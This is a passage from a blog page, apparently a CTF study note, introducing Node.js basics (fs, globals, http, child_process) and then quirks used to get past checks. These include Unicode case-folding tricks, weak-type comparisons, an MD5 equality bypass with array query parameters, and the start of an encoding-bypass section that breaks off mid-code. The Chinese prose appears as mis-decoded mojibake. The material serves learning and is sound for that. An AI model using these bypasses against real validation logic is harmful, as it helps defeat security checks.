<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>Web_11_Node.js | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!1},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1,share:!0,reward:{enable:!0,img_link:null,text:"è°¢è°¢ä½ è¯·æˆ‘å–å’–å•¡!!!"}},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">Web_11_Node.js</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-05-30 21:49:29</span> <span class="mobile">2023-05-30 21:49</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-06-10 22:51:52</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/Study/">Study</a>&nbsp;</li><li>| <a href="/tags/Node-js/">Node.js</a>&nbsp;</li><li>| <a href="/tags/JavaScript/">JavaScript</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>6.8k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>30 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h3 id="Node-jsåŸºç¡€"><a href="#Node-jsåŸºç¡€" class="headerlink" title="Node.jsåŸºç¡€"></a>Node.jsåŸºç¡€</h3><p>ç®€å•çš„è¯´nodejså°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„JavaScript, Node.jsæ˜¯ä¸€ä¸ªåŸºäºchrome JavaScriptè¿è¡Œæ—¶å»ºç«‹çš„ä¸€ä¸ªå¹³å°, Node.jsæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨I/OæœåŠ¡ç«¯JavaScriptç¯å¢ƒ, åŸºäº<a class="link" target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/550025142">Googleçš„V8å¼•æ“<i class="fas fa-external-link-alt"></i></a>, V8å¼•æ“æ‰§è¡ŒJavascriptçš„é€Ÿåº¦éå¸¸å¿«ï¼Œæ€§èƒ½éå¸¸å¥½ã€‚åœ¨æµè§ˆå™¨æ§åˆ¶å°æˆ–è€…nodeçš„è¿è¡Œç¯å¢ƒéƒ½å±äºreplè¿è¡Œç¯å¢ƒ, å‡å¯è¿è¡ŒJavaScriptä»£ç </p><p>åœ¨Node.jsä¸­åˆ†ä¸ºä¸‰ä¸ªæ¨¡å—, åˆ†åˆ«æ˜¯: æ ¸å¿ƒæ¨¡å—/è‡ªå®šä¹‰æ¨¡å—/ç¬¬ä¸‰æ–¹æ¨¡å—</p><p>è¿™é‡Œæä¸€ç‚¹, JavaScriptåœ¨ç¼–ç¨‹æ—¶, å¦‚æœéœ€è¦ä½¿ç”¨æŸä¸ªæ¨¡å—çš„åŠŸèƒ½, é‚£ä¹ˆå°±éœ€è¦æå‰å°†å…¶å¯¼å…¥, ä¸Pythonç±»ä¼¼, åªä¸è¿‡åœ¨Pythonä¸­ä½¿ç”¨<code>import</code>å…³é”®å­—, è€Œåœ¨JavaScriptä¸­ä½¿ç”¨<code>require</code>å…³é”®å­—</p><h4 id="Node-js-å®‰è£…"><a href="#Node-js-å®‰è£…" class="headerlink" title="Node.js å®‰è£…"></a>Node.js å®‰è£…</h4><p>å¤§å®¶å¯ä»¥è‡ªè¡Œå»<a class="link" target="_blank" rel="noopener" href="https://www.runoob.com/nodejs/nodejs-install-setup.html">èœé¸Ÿ<i class="fas fa-external-link-alt"></i></a>å­¦ä¹ å®‰è£…é…ç½®</p><p>å®‰è£…å®Œæˆå, å¤§å®¶å¯ä»¥åœ¨å‘½ä»¤è¡Œæµ‹è¯•ä¸€ä¸‹<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230515163600122.png" alt="image-20230515163600122"></p><h4 id="è¯»å–æ–‡ä»¶æ“ä½œ"><a href="#è¯»å–æ–‡ä»¶æ“ä½œ" class="headerlink" title="è¯»å–æ–‡ä»¶æ“ä½œ"></a>è¯»å–æ–‡ä»¶æ“ä½œ</h4><p>æ–‡ä»¶ç³»ç»Ÿæ¨¡å—å°±æ˜¯æ ¸å¿ƒæ¨¡å—<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/rR5DW4ytcUKuMeV.png" alt="6c44bbeca90854f4fb2b4a0abbe350c8.png"></p><p>fsæ–‡ä»¶æ“ä½œæ¨¡å—, åŒæ­¥å‡½æ•°: <code>readFileSync</code>; å¼‚æ­¥å‡½æ•°: <code>readFile</code></p><p>åŒºåˆ«:</p><blockquote><p>åŒæ­¥æ–¹æ³•: ç­‰å¾…æ¯ä¸ªæ“ä½œå®Œæˆ, ç„¶åæ‰§è¡Œä¸‹ä¸€ä¸ªæ“ä½œ (å…ˆåƒé¥­å†çœ‹ç”µè§†)</p><p>å¼‚æ­¥æ–¹æ³•: ä»ä¸ç­‰å¾…æ¯ä¸ªæ“ä½œå®Œæˆ, è€Œæ˜¯æ—¨åœ¨ç¬¬ä¸€æ­¥æ‰§è¡Œæ‰€æœ‰æ“ä½œ (è¾¹åƒé¥­è¾¹çœ‹ç”µè§†)</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼‚æ­¥è¯»å–</span></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./test.txt&#x27;</span>, <span class="keyword">function</span> (<span class="params">err, data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¼‚æ­¥è¯»å–ï¼š&quot;</span> + data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//åŒæ­¥è¯»å–</span></span><br><span class="line"><span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./test.txt&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åŒæ­¥è¯»å–:&quot;</span> + data.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230515220143920.png" alt="image-20230515220143920"></p><blockquote><p>å½“ä½ å…ˆè¯»å–æ–‡ä»¶è¾“å‡ºåè¾“å‡ºä¸€æ®µè¯çš„æ—¶å€™<br>åŒæ­¥ï¼šå…ˆè¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œå†è¾“å‡ºä¸€æ®µè¯<br>å¼‚æ­¥ï¼šå…ˆè¾“å‡ºä¸€æ®µè¯ï¼Œåè¾“å‡ºæ–‡ä»¶å†…å®¹</p></blockquote><p>è¯»å–æ–‡ä»¶æ“ä½œ, ä¸‹é¢ä¼šåœ¨CTFä¾‹é¢˜ä¸­ç”¨åˆ°. æ˜¾ç¤ºäº†è¯»å–æ–‡ä»¶çš„å„ç§å§¿åŠ¿</p><h4 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h4><ul><li><code>__dirname</code>: å½“å‰æ¨¡å—çš„ç›®å½•å</li><li><code>__filename</code>: å½“å‰æ¨¡å—çš„æ–‡ä»¶å, è¿™æ˜¯å½“å‰æ¨¡å—æ–‡ä»¶çš„ç»å¯¹è·¯å¾„(ç¬¦å·é“¾æ¥ä¼šè¢«è§£æ)</li><li><code>exports</code>å˜é‡æ˜¯é»˜è®¤èµ‹å€¼ç»™<code>module.exports</code>, å®ƒå¯ä»¥è¢«èµ‹äºˆæ–°å€¼, å®ƒä¼šæš‚æ—¶ä¸ä¼šç»‘å®šåˆ°<code>module.exports</code></li><li><code>module</code>: åœ¨æ¯ä¸ªæ¨¡å—ä¸­, <code>module</code>çš„è‡ªç”±å˜é‡æ˜¯å¯¹è¡¨è¾¾å½“å‰æ¨¡å—çš„å¯¹è±¡çš„å¼•ç”¨. ä¸ºæ–¹ä¾¿èµ·è§, è¿˜å¯ä»¥é€šè¿‡å…¨å±€æ¨¡å—çš„<code>exports</code>è®¿é—®<code>module.exports</code> <code>module</code>å®é™…ä¸Šä¸æ˜¯å…¨å±€çš„, è€Œæ˜¯æ¯ä¸ªæ¨¡å—æœ¬åœ°çš„</li><li><code>require</code>æ¨¡å—æ˜¯å¼•å…¥æ¨¡å—, jsonæˆ–è€…æœ¬åœ°æ–‡ä»¶, å¯ä»¥ä»<code>node_modules</code>å¼•å…¥æ¨¡å—</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¼•å…¥jsonæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">const</span> jsonData = <span class="built_in">require</span>(<span class="string">&#x27;./path/filename.json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼•å…¥ node_modules æ¨¡å—æˆ–è€… Node.js å†…ç½®æ¨¡å—</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è‡ªè¡Œè®¾ç½®:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">charmersix</span>=<span class="number">6</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230515231500078.png" alt="image-20230515231500078"></p><p>ç»å¸¸ä½¿ç”¨çš„å…¨å±€å˜é‡æ˜¯<code>__dirname</code>, <code>__filename</code></p><h4 id="HTTPæœåŠ¡"><a href="#HTTPæœåŠ¡" class="headerlink" title="HTTPæœåŠ¡"></a>HTTPæœåŠ¡</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¼•å…¥httpæ ¸å¿ƒæ¨¡å—</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªæœåŠ¡</span></span><br><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>();</span><br><span class="line"><span class="comment">//ç»‘å®šé“¾æ¥</span></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="keyword">function</span> (<span class="params">res,rs</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">method</span>); <span class="comment">//æ‰“å°è¯·æ±‚æ–¹å¼</span></span><br><span class="line">    rs.<span class="title function_">write</span>(<span class="string">&#x27;hello,world&#x27;</span>);  <span class="comment">//è¿”å›æ•°æ®</span></span><br><span class="line">    rs.<span class="title function_">end</span>(); <span class="comment">//æ–­å¼€è¿æ¥</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//å¯åŠ¨ç›‘å¬</span></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">8686</span>,<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è¯·è®¿é—®127.0.0.1:8686&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516001045104.png" alt="image-20230516001045104"></p><h4 id="child-process-åˆ›å»ºå­è¿›ç¨‹"><a href="#child-process-åˆ›å»ºå­è¿›ç¨‹" class="headerlink" title="child_process(åˆ›å»ºå­è¿›ç¨‹)"></a>child_process(åˆ›å»ºå­è¿›ç¨‹)</h4><p><code>child_process</code>æä¾›äº†å‡ ç§åˆ›å»ºå­è¿›ç¨‹çš„æ–¹å¼</p><blockquote><p>å¼‚æ­¥æ–¹æ³•: spawnã€execã€execFileã€fork</p><p>åŒæ­¥æ–¹æ³•: spawnSyncã€execSyncã€execFileSync</p></blockquote><p>ç»è¿‡ä¸Šé¢çš„åŒæ­¥å’Œå¼‚æ­¥æ€æƒ³çš„ç†è§£, åˆ›å»ºå­è¿›ç¨‹çš„åŒæ­¥å¼‚æ­¥æ–¹å¼åº”è¯¥ä¸éš¾ç†è§£</p><p>åœ¨å¼‚æ­¥åˆ›å»ºè¿›ç¨‹æ—¶, <code>spawn</code>æ˜¯åŸºç¡€, å…¶ä»–çš„fork/exec/execFileéƒ½æ˜¯åŸºäº<code>spawn</code>æ¥ç”Ÿæˆçš„</p><p>åŒæ­¥åˆ›å»ºè¿›ç¨‹å¯ä»¥ä½¿ç”¨<code>child_process.spawnSync()</code>ã€<code>child_process.execSync()</code>å’Œ<code>child_process.execFileSync()</code>, åŒæ­¥çš„æ–¹æ³•ä¼šé˜»å¡Node.jsäº‹ä»¶å¾ªç¯ã€æš‚åœä»»ä½•å…¶ä»–ä»£ç çš„æ‰§è¡Œ, ç›´åˆ°å­è¿›ç¨‹é€€å‡º.</p><h3 id="Node-jsç‰¹æ€§"><a href="#Node-jsç‰¹æ€§" class="headerlink" title="Node.jsç‰¹æ€§"></a>Node.jsç‰¹æ€§</h3><h4 id="å¤§å°å†™ç‰¹æ€§"><a href="#å¤§å°å†™ç‰¹æ€§" class="headerlink" title="å¤§å°å†™ç‰¹æ€§"></a>å¤§å°å†™ç‰¹æ€§</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">toUpperCase</span>()</span><br><span class="line"><span class="title function_">toLowerCase</span>()</span><br></pre></td></tr></table></figure><p>å¯¹äºtoUpperCase(): å­—ç¬¦<code>&quot;Ä±&quot;</code>ã€<code>&quot;Å¿&quot;</code> ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º <code>&quot;I&quot;</code>ã€<code>&quot;S&quot;</code><br>å¯¹äºtoLowerCase(): å­—ç¬¦<code>&quot;K&quot;</code>ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º<code>&quot;k&quot;</code>(è¿™ä¸ªKä¸æ˜¯K)</p><h4 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h4><h5 id="å¤§å°æ¯”è¾ƒ"><a href="#å¤§å°æ¯”è¾ƒ" class="headerlink" title="å¤§å°æ¯”è¾ƒ"></a>å¤§å°æ¯”è¾ƒ</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>==<span class="string">&#x27;1&#x27;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>&gt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;asd&#x27;</span>&gt;<span class="number">1</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516213005069.png" alt="image-20230516213005069"></p><p>æ€»ç»“: æ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶, ä¼šä¼˜å…ˆå°†çº¯æ•°å­—å‹å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒ; è€Œå­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶, ä¼šå°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬åŒ–ä¸ºASCIIç ä¹‹åå†è¿›è¡Œæ¯”è¾ƒ, å› æ­¤å°±ä¼šå‡ºç°ç¬¬äº”è¡Œä»£ç è¿™ç§æƒ…å†µ; è€Œéæ•°å­—å‹å­—ç¬¦ä¸²ä¸ä»»ä½•æ•°å­—è¿›è¡Œæ¯”è¾ƒéƒ½æ˜¯false</p><h5 id="æ•°ç»„æ¯”è¾ƒ"><a href="#æ•°ç»„æ¯”è¾ƒ" class="headerlink" title="æ•°ç»„æ¯”è¾ƒ"></a>æ•°ç»„æ¯”è¾ƒ</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]==[]); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]&gt;[]); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">6</span>,<span class="number">2</span>]&gt;[<span class="number">5</span>]); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">100</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;test&#x27;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">11</span>,<span class="number">16</span>]&lt;<span class="string">&#x27;10&#x27;</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516215354747.png" alt="image-20230516215354747"></p><p>æ€»ç»“: ç©ºæ•°ç»„ä¹‹é—´æ¯”è¾ƒæ°¸è¿œä¸ºfalse, æ•°ç»„ä¹‹é—´æ¯”è¾ƒåªæ¯”è¾ƒæ•°ç»„é—´çš„ç¬¬ä¸€ä¸ªå€¼, å¯¹ç¬¬ä¸€ä¸ªå€¼é‡‡ç”¨å‰é¢æ€»ç»“çš„æ¯”è¾ƒæ–¹æ³•, æ•°ç»„ä¸éæ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒ, æ•°ç»„æ°¸è¿œå°äºéæ•°å€¼å‹å­—ç¬¦ä¸², æ•°ç»„ä¸æ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒ, å–ç¬¬ä¸€ä¸ªä¹‹åæŒ‰å‰é¢æ€»ç»“çš„æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ</p><h5 id="ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰"><a href="#ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰" class="headerlink" title="ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰"></a>ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>==<span class="literal">undefined</span>); <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>===<span class="literal">undefined</span>); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>==<span class="title class_">NaN</span>); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>===<span class="title class_">NaN</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516221145458.png" alt="image-20230516221145458"></p><h5 id="å˜é‡æ‹¼æ¥"><a href="#å˜é‡æ‹¼æ¥" class="headerlink" title="å˜é‡æ‹¼æ¥"></a>å˜é‡æ‹¼æ¥</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">3</span>]); <span class="comment">//56,3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516221509604.png" alt="image-20230516221509604"></p><h4 id="MD5çš„ç»•è¿‡"><a href="#MD5çš„ç»•è¿‡" class="headerlink" title="MD5çš„ç»•è¿‡"></a>MD5çš„ç»•è¿‡</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure><p><code>a[x]=1&amp;b[x]=2</code></p><p>æ•°ç»„ä¼šè¢«è§£ææˆ<code>[object Object]</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516221853272.png" alt="image-20230516221853272"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516222009060.png" alt="image-20230516222009060"></p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><h5 id="16è¿›åˆ¶ç¼–ç "><a href="#16è¿›åˆ¶ç¼–ç " class="headerlink" title="16è¿›åˆ¶ç¼–ç "></a>16è¿›åˆ¶ç¼–ç </h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>===<span 